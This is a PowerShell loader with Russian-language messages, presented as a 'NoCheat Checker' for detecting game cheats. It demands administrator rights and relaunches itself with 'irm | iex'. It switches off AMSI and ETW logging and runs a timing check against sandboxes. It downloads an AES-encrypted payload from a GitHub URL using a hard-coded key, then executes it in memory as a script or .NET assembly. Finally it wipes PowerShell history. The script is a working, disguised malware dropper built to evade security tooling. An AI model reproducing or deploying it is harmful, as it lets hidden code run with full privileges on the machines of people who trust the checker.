$ErrorActionPreference = "Stop"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
        }
    } catch {}
}

if (-not $isAdmin) {
    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
    Clear-PSHistory
    exit
}

Write-Host "==========================================" -ForegroundColor Yellow
Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Yellow

try {
    $amsiType = [psobject].Assembly.GetType("System.Management.Automation.AmsiUtils")
    if ($amsiType) {
        $amsiField = $amsiType.GetField("amsiInitFailed", [Reflection.BindingFlags] "NonPublic,Static")
        if ($amsiField) { $amsiField.SetValue($null, $true) }
    }
} catch {}

try {
    $etwType = [psobject].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
    if ($etwType) {
        $etwField = $etwType.GetField("etwProvider", [Reflection.BindingFlags] "NonPublic,Static")
        if ($etwField) {
            $etwProvider = $etwField.GetValue($null)
            if ($etwProvider) {
                $enabledField = $etwProvider.GetType().GetField("m_enabled", [Reflection.BindingFlags] "NonPublic,Instance")
                if ($enabledField) { $enabledField.SetValue($etwProvider, 0) }
            }
        }
    }
} catch {}

$t_start = Get-Date
Start-Sleep -Milliseconds 150
if (((Get-Date) - $t_start).TotalMilliseconds -lt 100) { return }

$keyB64 = "gu2koIlU7CZc/688IiTjF7zHemZgBINLWrnhn2LBpk4="
$ivB64 = "ZIdLvAC84tJ3L5hxoOLCGw=="
$encUrl = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.enc.b64"

try {
    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
    $wc = New-Object System.Net.WebClient
    $encB64 = $wc.DownloadString($encUrl)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [Convert]::FromBase64String($keyB64)
    $aes.IV = [Convert]::FromBase64String($ivB64)
    $decryptor = $aes.CreateDecryptor()
    $encBytes = [Convert]::FromBase64String($encB64)
    $decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)

    $ms = New-Object System.IO.MemoryStream(,$decBytes)
    $ds = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
    $msOut = New-Object System.IO.MemoryStream
    $ds.CopyTo($msOut)
    $payloadBytes = $msOut.ToArray()

    try {
        $payloadText = [System.Text.Encoding]::Unicode.GetString($payloadBytes)
        if ($payloadText -match "^\s*param\(" -or $payloadText -match "function ") {
            $sb = [ScriptBlock]::Create($payloadText)
            & $sb
        } else { throw "not ps1" }
    } catch {
        $asm = [Reflection.Assembly]::Load($payloadBytes)
        $entry = $asm.EntryPoint
        if ($entry) { $entry.Invoke($null, (, [object[]] @())) } else { [Reflection.Assembly]::Load($payloadBytes) | Out-Null }
    }

    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
}

Clear-PSHistory
exit
